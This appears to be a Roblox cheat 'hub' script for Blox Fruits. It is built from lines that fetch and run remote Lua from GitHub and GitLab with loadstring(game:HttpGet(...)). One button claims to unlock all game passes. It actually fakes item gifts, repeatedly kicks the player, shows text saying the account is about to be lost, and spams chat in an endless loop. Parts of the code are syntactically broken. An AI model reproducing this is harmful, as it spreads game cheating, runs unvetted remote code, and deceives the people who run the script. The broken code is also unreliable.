

-----Fai Fao-----------
-------Best Script------------

loadstring(game:HttpGet("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/ZHZH0MIYKR.lua"))()

local config = {
   ["HeaderWidth"] = 200,
   ['PrimaryColor'] = Color3.fromRGB(166, 167, 159),
   ['SecondaryColor'] = Color3.fromRGB(73, 103, 123),
   ["AccentColor"] = Color3.new(0.6,0,0)
}

--- GUI Setup ---
local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
local lpg = gui:CreateCategory("Fai Fao Hub")

----MAIN------
lpg:CreateButton("(1) Unique Crack By FaiFao",function() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/AkiraNus/UniquehubKak/main/FreeCr.Xenonhub"))( end)

lpg:CreateButton("(2) Bấm Vô Thử Đi",function() --one src for skid 
xwd = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
Gamename = xwd.Name
local games = {
[game.PlaceId] = {
    Title = "Blox Fruits",
    Icons = "",
    Welcome = function()
            return tostring(
            " "
                ..

                        Gamename.. "!" .. " Fai Fao Hub Xàm Vl]"  .."\n Loadded Successfully Fai Fao unlock all game pass"
            )
    end
}
}
if games[game.PlaceId] then	
if games[game.PlaceId].Title == "Blox Fruits" then
    local function notify(types, ...)
            if types == "Notify" then
            require(game.ReplicatedStorage.Notification).new(...):Display()
            end
    end
    notify("Notify", games[game.PlaceId].Welcome())
end
end

local rac = require(game.ReplicatedStorage.Notification)
local v9 = game.Players.LocalPlayer.Character:FindFirstChild("Dark Blade")
local v98 = game.Players.LocalPlayer.Character:FindFirstChild("Rogue-Rogue")
local v100 = game.Players.LocalPlayer.Character:FindFirstChild("Awakening")
local p21 = function(l)
    game.Players.LocalPlayer:Kick(l)
end
local c21 = function(n)
    game.Players.LocalPlayer:Kick(n)
end
local d23 = function(b)
    game.Players.LocalPlayer:Kick(b)
end
local itemne = {
    darkblade,
    rogue,
    racev4
}
local reason = a3
local a3 = p59
local p59 = p99
local p99 = "You have been detect you are kid."
local item = o2
local o2 = v1
local v1 = p22
local p22 = function(k)
    if k then
        p21(p99)
    end
end

local o = e
local e = b
local b = function(a, c)
    if c == true then
        print(a)
    end
end

rac.new("<=)) Fai Fao> aka (Nguyên) Admin!, send you many gifts from far away")
b(itemne,true)

local darkblade = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
darkblade.Name = "Dark Blade"
darkblade.CanBeDropped = false

local rogue = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
rogue.Name = "Rogue-Rogue"
rogue.CanBeDropped = false

local racev4 = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
racev4.Name = "Awakening"
racev4.CanBeDropped = false

spawn(function()
    while wait(0.00001) do
        p22(v9)
        p22(v98)
        p22(v100)
    end
end)

local cac = Instance.new('ScreenGui')
cac.Parent = game.CoreGui

local lon = Instance.new('TextLabel')
lon.Parent = cac
lon.BackgroundTransparency = 1
lon.TextSize = 50
lon.Text = 'Chuẩn Bị Bay Acc'
lon.TextColor3 = Color3.fromRGB(255,255,255)
lon.Size = UDim2.new(1,0,1,0)
repeat wait(1) until game:IsLoaded()


wait(1.1)

game.StarterGui:SetCore("SendNotification", {
    Icon = "";
    Title = "npt Hub", 
    Text = "Check Join discord"
})

wait(2.4)

game.StarterGui:SetCore("SendNotification", {
    Icon = "";
    Title = "Fai Fao Hub", 
    Text = "welecome Fai Fao Hub"
})

local cac = Instance.new('ScreenGui')
cac.Parent = game.CoreGui

local lon = Instance.new('TextLabel')
lon.Parent = cac
lon.BackgroundTransparency = 1
lon.TextSize = 50
lon.Text = 'Gà bay acc nha'
lon.TextColor3 = Color3.fromRGB(255,255,255)
lon.Size = UDim2.new(1,0,1,0)
repeat wait(1) until game:IsLoaded()



local args2 = {
    [1] = "Fai Fao số 1",
    [2] = "All"
}
local args = {

    [1] = "Fai Fao Hub On Top",

    [2] = "All"
}
while wait() do
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait(.1)
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args2))
wait(1)
end end)


function twitterCodes()
    codes = require(game:GetService("ReplicatedStorage").Sandbox.Codes).YoutuberCodes
    print('----------- Begin Twitter Codes -----------')
    for code, youtuber in pairs(codes) do
    --game:GetService("ReplicatedStorage").Remotes.CodeItem:InvokeServer({
       -- ["Value"] = code
    --})
    --wait(20)
    print('[Code]: '..code..' [Youtuber:] '..youtuber)
   end
   print('------------- End Twitter Codes -------------')
end
